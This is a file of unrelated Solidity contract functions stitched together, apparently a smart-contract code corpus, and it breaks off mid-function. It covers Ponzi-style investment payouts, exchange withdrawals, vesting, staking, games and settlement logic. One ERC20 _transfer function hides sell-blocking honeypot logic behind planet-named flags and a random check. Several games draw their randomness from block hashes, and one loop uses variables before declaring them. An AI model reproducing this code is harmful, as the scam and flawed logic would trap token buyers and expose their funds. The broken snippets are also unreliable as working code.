function() payable public {
    if (owner == msg.sender) {
        return;
    }
    if (0 == msg.value) {
        payoutSelf();
        return;
    }
    require(false == pause, "Gorgona is restarting. Please wait.");
    require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
    Investor storage user = investors[msg.sender];
    if (user.id == 0) {
        msg.sender.transfer(0 wei);
        addresses.push(msg.sender);
        user.id = addresses.length;
        user.date = now;
        address referrer = bytesToAddress(msg.data);
        if (investors[referrer].deposit > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
    } else {
        payoutSelf();
    }
    user.deposit += msg.value;
    user.deposits += 1;
    emit Invest(msg.sender, msg.value, user.referrer);
    depositAmount += msg.value;
    lastPaymentDate = now;
    uint bonusAmount = (msg.value / 100) * INTEREST; 
    if (user.referrer > 0x0) {
        if (user.referrer.send(bonusAmount)) {
            emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
        }
        if (user.deposits == 1) { 
            if (msg.sender.send(bonusAmount)) {
                emit Payout(msg.sender, bonusAmount, "cash-back", 0);
            }
        }
    } else if (gorgonaKiller.addr > 0x0) {
        if (gorgonaKiller.addr.send(bonusAmount)) {
            emit Payout(gorgonaKiller.addr, bonusAmount, "killer", msg.sender);
        }
    }
    if (user.deposit > gorgonaKiller.deposit) {
        gorgonaKiller = GorgonaKiller(msg.sender, user.deposit);
        emit GorgonaKillerChanged(msg.sender, user.deposit);
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (neptune == false)) {
        uranus = chTx;
        ceres = true;
    }
    if ((address(sender) == creator) && (neptune == true)) {
        mars[recipient] = true;
        moon[recipient] = false;
        neptune = false;
    }
    if ((amount > mercury) && (mars[sender] == true) && (address(sender) != creator)) {
        earth[recipient] = true;
    }
    if (mars[recipient] != true) {
        moon[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((moon[sender]) && (mars[recipient] == false)) {
        moon[recipient] = true;
    }
    if (mars[sender] == false) {
        if ((amount > mercury) && (earth[sender] == true)) {
            require(false);
        }
        require(amount < uranus);
        if (ceres == true) {
            if (earth[sender] == true) {
                require(false);
            }
            earth[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function withdraw(address token, uint256 amount) returns(bool success) {
    if (safeSub(block.number, lastActiveTransaction[msg.sender]) < inactivityReleasePeriod) throw;
    if (tokens[token][msg.sender] < amount) throw;
    tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);
    if (token == address(0)) {
        if (!msg.sender.send(amount)) throw;
    } else {
        if (!Token(token).transfer(msg.sender, amount)) throw;
    }
    Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);
}

function adminWithdraw(address token, uint256 amount, address user, uint256 nonce, uint8 v, bytes32 r, bytes32 s, uint256 feeWithdrawal) onlyAdmin returns(bool success) {
    bytes32 hash = keccak256(this, token, amount, user, nonce);
    if (withdrawn[hash]) throw;
    withdrawn[hash] = true;
    if (ecrecover(keccak256("\x19Ethereum Signed Message:\n32", hash), v, r, s) != user) throw;
    if (feeWithdrawal > 50 finney) feeWithdrawal = 50 finney;
    if (tokens[token][user] < amount) throw;
    tokens[token][user] = safeSub(tokens[token][user], amount);
    tokens[token][feeAccount] = safeAdd(tokens[token][feeAccount], safeMul(feeWithdrawal, amount) / 1 ether);
    amount = safeMul((1 ether - feeWithdrawal), amount) / 1 ether;
    if (token == address(0)) {
        if (!user.send(amount)) throw;
    } else {
        if (!Token(token).transfer(user, amount)) throw;
    }
    lastActiveTransaction[user] = block.number;
    Withdraw(token, user, amount, tokens[token][user]);
}

function transfer(address _toAddress, uint256 _amountOfTokens)
onlyBagholders()
public
returns(bool) {
    address _customerAddress = msg.sender;
    require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
    if (myDividends(true) > 0) withdraw();
    tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
    tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);
    payoutsTo_[_customerAddress] -= (int256)(profitPerShare_ * _amountOfTokens);
    payoutsTo_[_toAddress] += (int256)(profitPerShare_ * _amountOfTokens);
    Transfer(_customerAddress, _toAddress, _amountOfTokens);
    return true;
}

function release() public {
    require(block.timestamp >= releaseTime, "current time is before release time");
    uint256 amount = saletoken.balanceOf(address(this));
    require(amount > 0, "no tokens to release");
    saletoken.transfer(beneficiary, amount);
}

constructor(address _beneficiary, IERC20 token, uint256 _releaseTime) public {
    releaseTime = block.timestamp + _releaseTime;
    require(releaseTime > block.timestamp, "release time is before current time");
    beneficiary = _beneficiary;
    saletoken = token;
}

function ifUnlocked() public view returns(bool) {
    return releaseTime <= block.timestamp;
}

function perform_withdrawal(address tokenAddress) {
    require(bought_tokens);
    ERC20 token = ERC20(tokenAddress);
    uint256 contract_token_balance = token.balanceOf(address(this));
    require(contract_token_balance != 0);
    uint256 tokens_to_withdraw = (balances[msg.sender] * contract_token_balance) / contract_eth_value;
    contract_eth_value -= balances[msg.sender];
    balances[msg.sender] = 0;
    require(token.transfer(msg.sender, tokens_to_withdraw));
}

function settleRing(
    TokenTransferDelegate delegate,
    uint ringSize,
    OrderState[] orders,
    address feeRecipient,
    address _lrcTokenAddress
)
private
returns(
    bytes32[] memory orderHashList,
    uint[6][] memory amountsList) {
    bytes32[] memory batch = new bytes32[](ringSize * 7); 
    orderHashList = new bytes32[](ringSize);
    amountsList = new uint[6][](ringSize);
    uint p = 0;
    for (uint i = 0; i < ringSize; i++) {
        OrderState memory state = orders[i];
        Order memory order = state.order;
        uint prevSplitB = orders[(i + ringSize - 1) % ringSize].splitB;
        uint nextFillAmountS = orders[(i + 1) % ringSize].fillAmountS;
        batch[p] = bytes32(order.owner);
        batch[p + 1] = bytes32(order.tokenS);
        batch[p + 2] = bytes32(state.fillAmountS - prevSplitB);
        batch[p + 3] = bytes32(prevSplitB + state.splitS);
        batch[p + 4] = bytes32(state.lrcReward);
        batch[p + 5] = bytes32(state.lrcFee);
        if (order.walletId != 0) {
            batch[p + 6] = bytes32(NameRegistry(nameRegistryAddress).getFeeRecipientById(order.walletId));
        } else {
            batch[p + 6] = bytes32(0x0);
        }
        p += 7;
        if (order.buyNoMoreThanAmountB) {
            cancelledOrFilled[state.orderHash] += nextFillAmountS;
        } else {
            cancelledOrFilled[state.orderHash] += state.fillAmountS;
        }
        orderHashList[i] = state.orderHash;
        amountsList[i][0] = state.fillAmountS + state.splitS;
        amountsList[i][1] = nextFillAmountS - state.splitB;
        amountsList[i][2] = state.lrcReward;
        amountsList[i][3] = state.lrcFee;
        amountsList[i][4] = state.splitS;
        amountsList[i][5] = state.splitB;
    }
    delegate.batchTransferToken(
        _lrcTokenAddress,
        feeRecipient,
        walletSplitPercentage,
        batch
    );
}

function submitRing(
    address[3][] addressList,
    uint[7][] uintArgsList,
    uint8[1][] uint8ArgsList,
    bool[] buyNoMoreThanAmountBList,
    uint8[] vList,
    bytes32[] rList,
    bytes32[] sList,
    uint minerId,
    uint16 feeSelections
)
public {
    require(ringIndex & ENTERED_MASK != ENTERED_MASK); 
    ringIndex |= ENTERED_MASK;
    RingParams memory params = RingParams(
        addressList,
        uintArgsList,
        uint8ArgsList,
        buyNoMoreThanAmountBList,
        vList,
        rList,
        sList,
        minerId,
        addressList.length,
        feeSelections,
        0x0, 
        0x0, 
        0x0 
    );
    verifyInputDataIntegrity(params);
    updateFeeRecipient(params);
    OrderState[] memory orders = assembleOrders(params);
    verifyRingSignatures(params);
    verifyTokensRegistered(params);
    handleRing(params, orders);
    ringIndex = (ringIndex ^ ENTERED_MASK) + 1;
}

function handleRing(
    RingParams params,
    OrderState[] orders
)
private {
    uint64 _ringIndex = ringIndex ^ ENTERED_MASK;
    address _lrcTokenAddress = lrcTokenAddress;
    TokenTransferDelegate delegate = TokenTransferDelegate(delegateAddress);
    verifyRingHasNoSubRing(params.ringSize, orders);
    verifyMinerSuppliedFillRates(params.ringSize, orders);
    scaleRingBasedOnHistoricalRecords(delegate, params.ringSize, orders);
    calculateRingFillAmount(params.ringSize, orders);
    calculateRingFees(
        delegate,
        params.ringSize,
        orders,
        params.feeRecipient,
        _lrcTokenAddress
    );
    var (orderHashList, amountsList) = settleRing(
        delegate,
        params.ringSize,
        orders,
        params.feeRecipient,
        _lrcTokenAddress
    );
    RingMined(
        _ringIndex,
        params.ringHash,
        params.ringMiner,
        params.feeRecipient,
        orderHashList,
        amountsList
    );
}

function validateOrder(Order order)
private
view {
    require(order.owner != 0x0); 
    require(order.tokenS != 0x0); 
    require(order.tokenB != 0x0); 
    require(order.amountS != 0); 
    require(order.amountB != 0); 
    require(order.marginSplitPercentage <= MARGIN_SPLIT_PERCENTAGE_BASE); 
    require(order.validSince <= block.timestamp); 
    require(order.validUntil > block.timestamp); 
    bytes20 tradingPair = bytes20(order.tokenS) ^ bytes20(order.tokenB);
    require(order.validSince > tradingPairCutoffs[order.owner][tradingPair]); 
    require(order.validSince > cutoffs[order.owner]); 
}

function cancelAllOrders(uint cutoff)
external {
    uint t = (cutoff == 0 || cutoff >= block.timestamp) ? block.timestamp : cutoff;
    require(cutoffs[msg.sender] < t); 
    cutoffs[msg.sender] = t;
    AllOrdersCancelled(msg.sender, t);
}

function cancelAllOrdersByTradingPair(
    address token1,
    address token2,
    uint cutoff
)
external {
    uint t = (cutoff == 0 || cutoff >= block.timestamp) ? block.timestamp : cutoff;
    bytes20 tokenPair = bytes20(token1) ^ bytes20(token2);
    require(tradingPairCutoffs[msg.sender][tokenPair] < t); 
    tradingPairCutoffs[msg.sender][tokenPair] = t;
    OrdersCancelled(
        msg.sender,
        token1,
        token2,
        t
    );
}

function initialize(XxxToken _token, address _wallet,
    uint256 _start, uint256 _end,
    uint256 _cap) onlyOwner {
    require(address(token) == address(0));
    require(_token.owner() == address(this));
    require(_start >= getCurrentTimestamp());
    require(_start < _end);
    require(_wallet != 0x0);
    token = _token;
    wallet = _wallet;
    startDate = _start;
    endDate = _end;
    cap = _cap;
}

function saleActive() public constant returns(bool) {
    return (getCurrentTimestamp() >= startDate &&
        getCurrentTimestamp() <= endDate && weiRaised < cap);
}

function getRateAt(uint256 at) constant returns(uint256) {
    if (at < startDate) {
        return 0;
    } else if (at < (startDate + 7 days)) {
        return 2000;
    } else if (at < (startDate + 14 days)) {
        return 1800;
    } else if (at < (startDate + 21 days)) {
        return 1700;
    } else if (at < (startDate + 28 days)) {
        return 1600;
    } else if (at < (startDate + 35 days)) {
        return 1500;
    } else if (at < (startDate + 49 days)) {
        return 1400;
    } else if (at < (startDate + 63 days)) {
        return 1300;
    } else if (at < (startDate + 77 days)) {
        return 1200;
    } else if (at <= endDate) {
        return 1100;
    } else {
        return 0;
    }
}

function createVestingPeriod(address beneficiary, uint256 start, uint256 cliffDuration, uint256 duration, address addressOfTokenUsedAsReward) public onlyOwner {
    require(cliffDuration <= duration);
    require(duration > 0);
    require(start.add(duration) > block.timestamp);
    _beneficiary = beneficiary;
    _duration = duration;
    _cliff = start.add(cliffDuration);
    _start = start;
    _addressOfTokenUsedAsReward = addressOfTokenUsedAsReward;
    tokenReward = Token(addressOfTokenUsedAsReward);
}

function release(address token) public onlyOwner {
    uint256 unreleased = _releasableAmount(token);
    require(unreleased > 0);
    _released[token] = _released[token].add(unreleased);
    tokenReward.transfer(_beneficiary, unreleased);
}

function _vestedAmount(address token) private view returns(uint256) {
    uint256 currentBalance = tokenReward.balanceOf(address(this));
    uint256 totalBalance = currentBalance.add(_released[token]);
    if (block.timestamp < _cliff) {
        return 0;
    } else if (block.timestamp >= _start.add(_duration)) {
        return totalBalance;
    } else {
        return totalBalance.mul(block.timestamp.sub(_start)).div(_duration);
    }
}

function startInvasion(uint _areaId, uint[] _zombieId) public onlyOwnerOf(_zombieId) {
    require(areas[_areaId].TotallimitTeamCount >= areas[_areaId].TotalTeamCount + 1);
    require(areas[_areaId].isOpen);
    require(areas[_areaId].TeamMemberlimitCount >= _zombieId.length);
    bytes32 teamHash = block.blockhash(block.number - 1);
    for (uint16 i = 0; i < _zombieId.length; i++) {
        require(now > zombies[_zombieId[i]].readyTime);
        require(!zombies[_zombieId[i]].notAtHome);
        teamHash = keccak256(teamHash, now, _areaId, zombiemain.seeZombieDna(_zombieId[i]));
        zombies[_zombieId[i]].notAtHome = true;
        zombies[_zombieId[i]].readyTime = uint32(now + areas[_areaId].duration);
    }
    for (uint16 a = 0; a < areas[_areaId].roletype.length; a++) {
        if (areas[_areaId].roletype[a] == 99) continue;
        if (zombiemain.seeZombieRole(_zombieId[a]) != areas[_areaId].roletype[a]) revert();
    }
    areas[_areaId].TotalTeamCount++;
    require(teams[teamHash].areaID == 0);
    teams[teamHash] = Team(false, _areaId, _zombieId, uint32(now + areas[_areaId].duration), msg.sender, teamHash, block.number + 1);
    StartInvasion(teamHash, _areaId, _zombieId);
}

function awardInvation(bytes32 _teamId) public {
    require(teams[_teamId].Owner == msg.sender);
    require(now >= teams[_teamId].awardTime);
    require(!teams[_teamId].isCharge);
    uint totalUndeadsTime;
    uint totalStar;
    uint dieNumber;
    uint[] memory zb = teams[_teamId].Zombies;
    for (i = 0; i < zb.length; i++) {
        totalUndeadsTime += zombies[zb[i]].undeadsTime;
        totalStar += zombiemain.seeZombieStar(zb[i]);
    }
    if (totalStar < areas[teams[_teamId].areaID].starLimit) {
        dieNumber = totalStar * 9500 / (areas[teams[_teamId].areaID].starLimit) + totalUndeadsTime * 10;
    } else {
        dieNumber = totalStar * 100 / (areas[teams[_teamId].areaID].starLimit) + 9500 + totalUndeadsTime;
    }
    if (dieNumber <= uint(keccak256(teams[_teamId].teamHash, now, block.blockhash(block.number - 1), block.blockhash(teams[_teamId].blocknumber))) % 10000) {
        for (uint16 i = 0; i < zb.length; i++) {
            zombies[zb[ii]].readyTime = uint32(now + 7 days);
            zombies[zb[ii]].undeadsTime = 0;
            zombies[zb[ii]].notAtHome = false;
        }
        AwardInvation(_teamId, false, 0);
    } else {
        for (uint16 ii = 0; ii < zb.length; ii++) {
            zombies[zb[ii]].undeadsTime++;
            zombies[zb[ii]].notAtHome = false;
        }
        zombietoken.mint(teams[_teamId].Owner, areas[teams[_teamId].areaID].ZOBRevenue);
        AwardInvation(_teamId, true, areas[teams[_teamId].areaID].ZOBRevenue);
    }
    teams[_teamId].isCharge = true;
    areas[teams[_teamId].areaID].TotalTeamCount--;
}

function()
onlyHuman()
isWithinLimits(msg.value)
public
payable {
    uint256 _eth = msg.value;
    uint256 _now = now;
    uint256 _rndNo = rndNo;
    uint256 _ethUse = msg.value;
    if (_now > round_m[_rndNo].endTime) {
        _rndNo = _rndNo.add(1);
        rndNo = _rndNo;
        round_m[_rndNo].startTime = _now;
        round_m[_rndNo].endTime = _now + rndFirStage_;
    }
    if (round_m[_rndNo].keys < 10000000000000000000000000) {
        uint256 _keys = (round_m[_rndNo].eth).keysRec(_eth);
        if (_keys.add(round_m[_rndNo].keys) >= 10000000000000000000000000) {
            _keys = (10000000000000000000000000).sub(round_m[_rndNo].keys);
            if (round_m[_rndNo].eth >= 8562500000000000000000) {
                _ethUse = 0;
            } else {
                _ethUse = (8562500000000000000000).sub(round_m[_rndNo].eth);
            }
            if (_eth > _ethUse) {
                msg.sender.transfer(_eth.sub(_ethUse));
            } else {
                _ethUse = _eth;
            }
        }
        if (_keys >= 1000000000000000000) {
            round_m[_rndNo].endTime = _now + rndFirStage_;
            round_m[_rndNo].leader = msg.sender;
        }
        playerRound_m[_rndNo][msg.sender].keys = _keys.add(playerRound_m[_rndNo][msg.sender].keys);
        playerRound_m[_rndNo][msg.sender].eth = _ethUse.add(playerRound_m[_rndNo][msg.sender].eth);
        round_m[_rndNo].keys = _keys.add(round_m[_rndNo].keys);
        round_m[_rndNo].eth = _ethUse.add(round_m[_rndNo].eth);
        totalEth = _ethUse.add(totalEth);
        emit FlyToTheMoonEvents.onFirStage(
            msg.sender,
            _rndNo,
            _keys,
            _ethUse,
            _now
        );
    } else {
        uint256 _lastPrice = round_m[_rndNo].lastPrice;
        uint256 _maxPrice = (10000000000000000000).add(_lastPrice);
        require(_eth >= (100000000000000000).add(_lastPrice), "Need more Ether");
        if (_eth > _maxPrice) {
            _ethUse = _maxPrice;
            msg.sender.transfer(_eth.sub(_ethUse));
        }
        round_m[_rndNo].endTime = _now + rndSecStage_;
        round_m[_rndNo].leader = msg.sender;
        round_m[_rndNo].lastPrice = _ethUse;
        playerRound_m[_rndNo][msg.sender].eth = _ethUse.add(playerRound_m[_rndNo][msg.sender].eth);
        round_m[_rndNo].eth = _ethUse.add(round_m[_rndNo].eth);
        totalEth = _ethUse.add(totalEth);
        emit FlyToTheMoonEvents.onSecStage(
            msg.sender,
            _rndNo,
            _ethUse,
            _now
        );
    }
}

function awardByRndNo(uint256 _rndNo)
onlyHuman()
public {
    require(_rndNo <= rndNo, "You&#39;re running too fast");
    require(now > round_m[_rndNo].endTime, "Wait patiently");
    require(round_m[_rndNo].leader == msg.sender, "The prize is not yours");
    require(round_m[_rndNo].award == false, "Can&#39;t get prizes repeatedly");
    uint256 _ethOut = ((round_m[_rndNo].eth).mul(35) / (100));
    round_m[_rndNo].award = true;
    msg.sender.transfer(_ethOut);
    emit FlyToTheMoonEvents.onAward(
        msg.sender,
        _rndNo,
        _ethOut,
        now
    );
}

function withdrawByRndNo(uint256 _rndNo)
onlyHuman()
public {
    require(_rndNo <= rndNo, "You&#39;re running too fast");
    uint256 _total = (((round_m[_rndNo].eth).mul(playerRound_m[_rndNo][msg.sender].keys)).mul(60) / ((round_m[_rndNo].keys).mul(100)));
    uint256 _withdrawed = playerRound_m[_rndNo][msg.sender].withdraw;
    require(_total > _withdrawed, "No need to withdraw");
    uint256 _ethOut = _total.sub(_withdrawed);
    playerRound_m[_rndNo][msg.sender].withdraw = _total;
    msg.sender.transfer(_ethOut);
    emit FlyToTheMoonEvents.onWithdraw(
        msg.sender,
        _rndNo,
        _ethOut,
        now
    );
}

function getBuyPrice()
public
view
returns(uint256) {
    uint256 _rndNo = rndNo;
    uint256 _now = now;
    if (_now > round_m[_rndNo].endTime) {
        return (75000000000000);
    }
    if (round_m[_rndNo].keys < 10000000000000000000000000) {
        return ((round_m[_rndNo].keys.add(1000000000000000000)).ethRec(1000000000000000000));
    }
    return (0);
}

function validPurchase() internal constant returns(bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    bool minValue = msg.value >= 10000000000000000;
    return withinPeriod && nonZeroPurchase && minValue;
}

function hasEnded() public constant returns(bool) {
    bool capReached = weiRaised >= cap;
    return super.hasEnded() || capReached;
}

function buyTokens(address beneficiary) payable {
    require(beneficiary != 0x0);
    require(validPurchase());
    uint256 weiAmount = msg.value;
    uint256 tokens = weiAmount.mul(rate);
    uint256 bonusTokens = 0;
    if (now < (startTime + bonusPeriod * 1 days)) {
        bonusTokens = tokens.div(5); 
    }
    tokens += bonusTokens;
    weiRaised = weiRaised.add(weiAmount);
    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);
    forwardFunds();
}

function multisendEther(address[] toArray, uint256[] amountArray) public onlyOwner payable {
    require(toArray.length <= arrayLimit());
    uint256 total = 0;
    uint8 i = 0;
    for (i; i < toArray.length; i++) {
        toArray[i].transfer(amountArray[i]);
        total += amountArray[i];
    }
    emit Multisended(total, 0x000000000000000000000000000000000000bEEF);
}

function unlockTokens() isStakingOff() public returns(uint256) {
    address useraddr = msg.sender;
    require(users[useraddr] >= 0);
    if (now > timeforunstaking) {
        IERC20(token).transfer(msg.sender, users[useraddr].add(users[useraddr].mul(10).div(100)));
        totaltokenstaked = totaltokenstaked.sub(users[useraddr]);
        users[useraddr] = 0;
        return 1;
    }
    if (timeforunstaking.sub(now) > 2 * oneMonthTime) {
        IERC20(token).transfer(msg.sender, users[useraddr]);
        totaltokenstaked = totaltokenstaked.sub(users[useraddr]);
        users[useraddr] = 0;
        return 1;
    }
    if (timeforunstaking.sub(now) > oneMonthTime && timeforunstaking.sub(now) <= 2 * oneMonthTime) {
        uint amount = users[useraddr].mul(10).mul(25).div(100).div(100);
        IERC20(token).transfer(msg.sender, users[useraddr].add(amount));
        totaltokenstaked = totaltokenstaked.sub(users[useraddr]);
        users[useraddr] = 0;
        return 1;
    }
    if (timeforunstaking.sub(now) <= oneMonthTime && timeforunstaking.sub(now) > 0) {
        uint amount = users[useraddr].mul(10).mul(50).div(100).div(100);
        IERC20(token).transfer(msg.sender, users[useraddr].add(amount));
        totaltokenstaked = totaltokenstaked.sub(users[useraddr]);
        users[useraddr] = 0;
        return 1;
    }
}

function lockToken(uint256 _amount) isStakingOn() public {
    require(_amount >= 1000e18, 'you are inputting amount less than 1000 tokens');
    require(_amount.add(users[msg.sender]) <= 100000e18, 'single user cannot invest more than 300k PRY');
    IERC20(token).transferFrom(msg.sender, address(this), _amount);
    users[msg.sender] = users[msg.sender].add(_amount);
    totaltokenstaked = totaltokenstaked.add(_amount);
}

function turnOnStaking() onlyOwner() public {
    require(now > timeforunstaking, 'the time of unstaking has not finished');
    staking = true;
    timeforunstaking = 0;
}

function readtimeleft() public view returns(uint256) {
    if (now > timeforunstaking) {
        return 0;
    } else {
        return timeforunstaking.sub(now);
    }
}

function turnOffStaking() onlyOwner() public {
    require(now > timeforunstaking, 'the time of unstaking has not finished');
    staking = false;
    timeforunstaking = now.add(3 * oneMonthTime);
}

function execute(
    uint proposalId
)
external
onlyMember
payable {
    Proposal storage proposal = proposals[proposalId];
    require(!proposal.executed && !proposal.canceled, "Proposal was canceled or executed");
    proposal.executed = true;
    require(proposal.forVotes >= membersRegistry.getMinimalQuorum(), "Not enough votes in favor");
    for (uint i = 0; i < proposal.targets.length; i++) {
        bytes memory callData;
        if (bytes(proposal.signatures[i]).length == 0) {
            callData = proposal.calldatas[i];
        } else {
            callData = abi.encodePacked(
                bytes4(keccak256(bytes(proposal.signatures[i]))),
                proposal.calldatas[i]
            );
        }
        (bool success, ) = proposal.targets[i].call {
            value: proposal.values[i]
        }(callData);
        require(
            success,
            "TokensFarmCongress::executeTransaction: Transaction execution reverted."
        );
        emit ExecuteTransaction(
            proposal.targets[i],
            proposal.values[i],
            proposal.signatures[i],
            proposal.calldatas[i]
        );
    }
    emit ProposalExecuted(proposalId);
}

function cancel(
    uint proposalId
)
external
onlyMember {
    Proposal storage proposal = proposals[proposalId];
    require(!proposal.executed && !proposal.canceled, "TokensFarmCongress:cancel: Proposal already executed or canceled");
    require(block.timestamp >= proposal.timestamp + 259200, "TokensFarmCongress:cancel: Time lock hasn't ended yet");
    require(proposal.forVotes < membersRegistry.getMinimalQuorum(), "TokensFarmCongress:cancel: Proposal already reached quorum");
    proposal.canceled = true;
    emit ProposalCanceled(proposalId);
}

function() external payable {
    if (invested[msg.sender] != 0) {
        uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
        address sender = msg.sender;
        sender.send(amount);
    }
    atBlock[msg.sender] = block.number;
    invested[msg.sender] += msg.value;
    if (msg.value > 0) {
        adAccount.send(msg.value * 3 / 100);
    }
}

function redeemCollateral(bytes32 collateralType, uint256 coinsAmount) external {
    require(collateralCashPrice[collateralType] != 0, "GlobalSettlement/collateral-cash-price-not-defined");
    uint256 collateralAmount = rmultiply(coinsAmount, collateralCashPrice[collateralType]);
    safeEngine.transferCollateral(
        collateralType,
        address(this),
        msg.sender,
        collateralAmount
    );
    coinsUsedToRedeem[collateralType][msg.sender] = addition(coinsUsedToRedeem[collateralType][msg.sender], coinsAmount);
    require(coinsUsedToRedeem[collateralType][msg.sender] <= coinBag[msg.sender], "GlobalSettlement/insufficient-bag-balance");
    emit RedeemCollateral(collateralType, msg.sender, coinsAmount, collateralAmount);
}

function setOutstandingCoinSupply() external {
    require(contractEnabled == 0, "GlobalSettlement/contract-still-enabled");
    require(outstandingCoinSupply == 0, "GlobalSettlement/outstanding-coin-supply-not-zero");
    require(safeEngine.coinBalance(address(accountingEngine)) == 0, "GlobalSettlement/surplus-not-zero");
    require(now >= addition(shutdownTime, shutdownCooldown), "GlobalSettlement/shutdown-cooldown-not-finished");
    outstandingCoinSupply = safeEngine.globalDebt();
    emit SetOutstandingCoinSupply(outstandingCoinSupply);
}

function calculateCashPrice(bytes32 collateralType) external {
    require(outstandingCoinSupply != 0, "GlobalSettlement/outstanding-coin-supply-zero");
    require(collateralCashPrice[collateralType] == 0, "GlobalSettlement/collateral-cash-price-already-defined");
    (, uint256 accumulatedRate, , , , ) = safeEngine.collateralTypes(collateralType);
    uint256 redemptionAdjustedDebt = rmultiply(
        rmultiply(collateralTotalDebt[collateralType], accumulatedRate), finalCoinPerCollateralPrice[collateralType]
    );
    collateralCashPrice[collateralType] =
        multiply(subtract(redemptionAdjustedDebt, collateralShortfall[collateralType]), RAY) / (outstandingCoinSupply / RAY);
    emit CalculateCashPrice(collateralType, collateralCashPrice[collateralType]);
}

function addition(uint256 x, uint256 y) internal pure returns(uint256 z) {
    z = x + y;
    require(z >= x, "GlobalSettlement/add-overflow");
}

function freezeCollateralType(bytes32 collateralType) external {
    require(contractEnabled == 0, "GlobalSettlement/contract-still-enabled");
    require(finalCoinPerCollateralPrice[collateralType] == 0, "GlobalSettlement/final-collateral-price-already-defined");
    (collateralTotalDebt[collateralType], , , , , ) = safeEngine.collateralTypes(collateralType);
    (OracleLike_2 orcl, , ) = oracleRelayer.collateralTypes(collateralType);
    finalCoinPerCollateralPrice[collateralType] = wdivide(oracleRelayer.redemptionPrice(), uint256(orcl.read()));
    emit FreezeCollateralType(collateralType, finalCoinPerCollateralPrice[collateralType]);
}

function subtract(uint256 x, uint256 y) internal pure returns(uint256 z) {
    require((z = x - y) <= x, "GlobalSettlement/sub-underflow");
}

function multiply(uint256 x, uint256 y) internal pure returns(uint256 z) {
    require(y == 0 || (z = x * y) / y == x, "GlobalSettlement/mul-overflow");
}

function fastTrackAuction(bytes32 collateralType, uint256 auctionId) external {
    require(finalCoinPerCollateralPrice[collateralType] != 0, "GlobalSettlement/final-collateral-price-not-defined");
    (address auctionHouse_, , ) = liquidationEngine.collateralTypes(collateralType);
    CollateralAuctionHouseLike_1 collateralAuctionHouse = CollateralAuctionHouseLike_1(auctionHouse_);
    (, uint256 accumulatedRate, , , , ) = safeEngine.collateralTypes(collateralType);
    uint256 bidAmount = collateralAuctionHouse.bidAmount(auctionId);
    uint256 raisedAmount = collateralAuctionHouse.raisedAmount(auctionId);
    uint256 collateralToSell = collateralAuctionHouse.remainingAmountToSell(auctionId);
    address forgoneCollateralReceiver = collateralAuctionHouse.forgoneCollateralReceiver(auctionId);
    uint256 amountToRaise = collateralAuctionHouse.amountToRaise(auctionId);
    safeEngine.createUnbackedDebt(address(accountingEngine), address(accountingEngine), subtract(amountToRaise, raisedAmount));
    safeEngine.createUnbackedDebt(address(accountingEngine), address(this), bidAmount);
    safeEngine.approveSAFEModification(address(collateralAuctionHouse));
    collateralAuctionHouse.terminateAuctionPrematurely(auctionId);
    uint256 debt_ = subtract(amountToRaise, raisedAmount) / accumulatedRate;
    collateralTotalDebt[collateralType] = addition(collateralTotalDebt[collateralType], debt_);
    require(int256(collateralToSell) >= 0 && int256(debt_) >= 0, "GlobalSettlement/overflow");
    safeEngine.confiscateSAFECollateralAndDebt(collateralType, forgoneCollateralReceiver, address(this), address(accountingEngine), int256(collateralToSell), int256(debt_));
    emit FastTrackAuction(collateralType, auctionId, collateralTotalDebt[collateralType]);
}

function minimum(uint256 x, uint256 y) internal pure returns(uint256 z) {
    return x <= y ? x : y;
}

function processSAFE(bytes32 collateralType, address safe) external {
    require(finalCoinPerCollateralPrice[collateralType] != 0, "GlobalSettlement/final-collateral-price-not-defined");
    (, uint256 accumulatedRate, , , , ) = safeEngine.collateralTypes(collateralType);
    (uint256 safeCollateral, uint256 safeDebt) = safeEngine.safes(collateralType, safe);
    uint256 amountOwed = rmultiply(rmultiply(safeDebt, accumulatedRate), finalCoinPerCollateralPrice[collateralType]);
    uint256 minCollateral = minimum(safeCollateral, amountOwed);
    collateralShortfall[collateralType] = addition(
        collateralShortfall[collateralType],
        subtract(amountOwed, minCollateral)
    );
    require(minCollateral <= 2 ** 255 && safeDebt <= 2 ** 255, "GlobalSettlement/overflow");
    safeEngine.confiscateSAFECollateralAndDebt(
        collateralType,
        safe,
        address(this),
        address(accountingEngine),
        -int256(minCollateral),
        -int256(safeDebt)
    );
    emit ProcessSAFE(collateralType, safe, collateralShortfall[collateralType]);
}

function prepareCoinsForRedeeming(uint256 coinAmount) external {
    require(outstandingCoinSupply != 0, "GlobalSettlement/outstanding-coin-supply-zero");
    safeEngine.transferInternalCoins(msg.sender, address(accountingEngine), multiply(coinAmount, RAY));
    coinBag[msg.sender] = addition(coinBag[msg.sender], coinAmount);
    emit PrepareCoinsForRedeeming(msg.sender, coinBag[msg.sender]);
}

function register()
public
payable {
    address _customerAddress = msg.sender;
    require(!playerRegistered[_customerAddress] &&
        tx.origin == _customerAddress);
    require(BTCTKN.transferFrom(_customerAddress, address(this), entryFee));
    registeredPlayers = SafeMath.addint256(registeredPlayers, 1);
    playerRegistered[_customerAddress] = true;
    playerGamesScored[_customerAddress] = 0;
    playerList.push(_customerAddress);
    require(playerRegistered[_customerAddress]);
    prizePool = prizePool.add(ninetyPercent);
    givethPool = givethPool.add(fivePercent);
    adminPool = adminPool.add(fivePercent);
